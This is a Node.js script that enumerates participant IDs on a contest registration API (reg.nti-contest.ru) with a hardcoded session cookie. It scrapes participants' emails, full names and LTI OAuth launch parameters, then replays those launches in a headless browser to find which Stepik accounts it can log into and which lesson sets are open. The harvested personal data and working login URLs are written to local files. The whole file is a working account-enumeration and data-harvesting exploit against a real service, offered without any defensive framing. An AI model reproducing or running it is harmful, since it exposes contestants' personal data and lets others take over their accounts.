const fs = require('fs')

const nodeFetch = require('node-fetch');
const tough = require('tough-cookie');
const puppeteer = require('puppeteer')

var cookiejar = new tough.CookieJar();
cookiejar.setCookieSync("AIOHTTP_SESSION=2772e16f0f42479bb1a2cb3dec43f9c7", 'https://reg.nti-contest.ru/api/reg_stepik_acc');

const fetch = require('fetch-cookie')(nodeFetch, cookiejar)



//const ids = require('./ids5854.js');
const ids = fs.readFileSync('./.readable', 'utf8').split('\n')//get all loginable accs
const personal = require('./personal.js');
const all = require('./all.js');
const info = []
//const getAllLoginable = require('getLoginable.js')
    const browserOptions = {
        headless: true,
        ignoreHTTPSErrors: true,
        args: ['--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-infobars',
            //'--window-position=0,0',
            '--ignore-certifcate-errors',
            '--ignore-certifcate-errors-spki-list',
            //'--user-agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3312.0 Safari/537.36"',
        ],
        defaultViewport: {
            width: 1280,
            height: 600,
            deviceScaleFactor: 1,
            isMobile: false,
            hasTouch: false,
            isLandscape: false
        }
    }

const delay = (ms) => {
    return new Promise((res, rej) => {
        setTimeout(res, ms)
    })
}

checkAllURLs();

async function checkAllURLs() {
    let len = ids.length;
    const browser = await puppeteer.launch(browserOptions);
    const page = await browser.newPage();
    await page.setCookie({ "name": "AIOHTTP_SESSION", "value": "2772e16f0f42479bb1a2cb3dec43f9c7", "domain": "reg.nti-contest.ru", "path": "/", "expires": -1, "size": 19, "httpOnly": false, "secure": false, "session": false })
    for (let i = len-5; i >= 0; i--) {
        //await delay(1000);
        try{
        let id = ids[i].match(/\?player_id=([0-9]*?)&/)[1];
        console.log(`id: ${id}`)
        let {content, isLoginable, url, isInfo, isMath} = await checkURL(page, id, 5);
        console.log(isLoginable)
        oldScript(content, isLoginable, id, url,isInfo, isMath);
        }catch(err){
            console.log(err);
            i++;
            continue;
        }
    }

    fs.writeFile('./all2.js', `module.exports = ${JSON.stringify(all, null, 2)};`, "utf8", (err, data) => {
        if (err) {
            console.error(err)
        }
    });
    fs.writeFile('./personal2.js', `module.exports = ${JSON.stringify(personal, null, 2)};`, "utf8", (err, data) => {
        if (err) {
            console.error(err)
        }
    });
    fs.writeFile('./info.json', `module.exports = ${JSON.stringify(info, null, 2)};`, "utf8", (err, data) => {
        if (err) {
            console.error(err)
        }
    });
    await browser.close()
}
async function checkURL(page, id, speciallyID) {
    const firstURL = `https://reg.nti-contest.ru/api/reg_stepik_acc?player_id=${id}&speciality_id=${speciallyID}`;
    await page.goto(firstURL,{waitUntil:60000});
    const content = await page.content();
    console.log('got content')
    //console.log(`https://reg.nti-contest.ru/api/reg_stepik_acc?player_id=${id}&speciality_id=${speciallyID}`)
    //console.log(content)
    if(content.indexOf('Игрок не найден по переданному ID.')>-1)return {content:content, isLoginable:false}
    if(content.indexOf('Server got itself in trouble')>-1){
        console.error('Server got itself in trouble: ', id)
        return {content:content, isLoginable:false}
    }
    await page.waitFor('form>button')
    await page.click('form>button')
    await page.waitForNavigation({waitUntil:60000});
    await page.content()
    const url = await page.url();
    console.log(url)
    let isLoginable = false;
    let isInfo = false
    let isMath = false
    if(url.indexOf('lesson/125724/')>-1){
        isLoginable = true
        /*await page.goto('https://stepik.org/lesson/126702/');
        const contentSecond = await page.content();
        try{
            await page.waitFor('.epic-error')
        }catch(err){
            isInfo = true;
            console.log(contentSecond);
        }for info*/
        await page.goto('https://stepik.org/lesson/136591/');
        const contentSecond = await page.content();
        try{
            await page.waitFor('.epic-error')
        }catch(err){
            isMath = true;
            console.log(contentSecond);
        }
    }
    return {content:content, isLoginable:isLoginable, url:firstURL, isInfo:isInfo, isMath:isMath}
}


async function checkURLOld(id, speciallyID) {
    return await fetch(`https://reg.nti-contest.ru/api/reg_stepik_acc?player_id=${id}&speciality_id=${speciallyID}`, {
            "headers": {},
            "referrerPolicy": "no-referrer-when-downgrade",
            "body": null,
            "method": "GET",
            "mode": "cors"
        }).then(res => res.text())
        .catch(res => res.text())
}



async function oldScript(res, isLoginable, id, url, isInfo, isMath) {
    if(res.match(/lis_person_contact_email_primary" value="(.*?)"/)===null)return;
        resultPersonal = {
            email: res.match(/lis_person_contact_email_primary" value="(.*?)"/)[1],
            name: res.match(/lis_person_name_full" value="(.*?)"/)[1]
        }
        console.log(resultPersonal.email)
        resultAll = {
            id:id,
            isLoginable: isLoginable,
            lti_version: res.match(/lti_version" value="(.*?)"/)[1],
            resource_link_id: res.match(/resource_link_id" value="(.*?)"/)[1],
            lis_person_contact_email_primary: res.match(/lis_person_contact_email_primary" value="(.*?)"/)[1],
            lis_person_name_full: res.match(/lis_person_name_full" value="(.*?)"/)[1],
            custom_course: res.match(/custom_course" value="(.*?)"/)[1],
            oauth_nonce: res.match(/oauth_nonce" value="(.*?)"/)[1],
            oauth_timestamp: res.match(/oauth_timestamp" value="(.*?)"/)[1],
            oauth_version: res.match(/oauth_version" value="(.*?)"/)[1],
            oauth_signature_method: res.match(/oauth_signature_method" value="(.*?)"/)[1],
            oauth_consumer_key: res.match(/oauth_consumer_key" value="(.*?)"/)[1],
            oauth_signature: res.match(/oauth_signature" value="(.*?)"/)[1]
        }
        personal.push(resultPersonal);

        if(isLoginable===true){
            all.push(resultAll);
            fs.appendFile('.loginable', JSON.stringify(resultAll)+'\n', "utf8", (err, data) => {
                if (err) {
                    console.error(err)
                }
            });
            fs.appendFile('.readable', url+'\n', "utf8", (err, data) => {
                if (err) {
                    console.error(err)
                }
            });
            if(isInfo===true){
                info.push(resultAll);
                fs.appendFile('.info', url+'\n', "utf8", (err, data) => {
                if (err) {
                    console.error(err)
                }
            });
            }
            if(isMath===true){
                info.push(resultAll);
                fs.appendFile('.math', url+'\n', "utf8", (err, data) => {
                if (err) {
                    console.error(err)
                }
            });}
        }

        fs.appendFile('.res2', res + '\n'+JSON.stringify(resultAll)+'\n', "utf8", (err, data) => {
            if (err) {
                console.error(err)
            }
        });
}




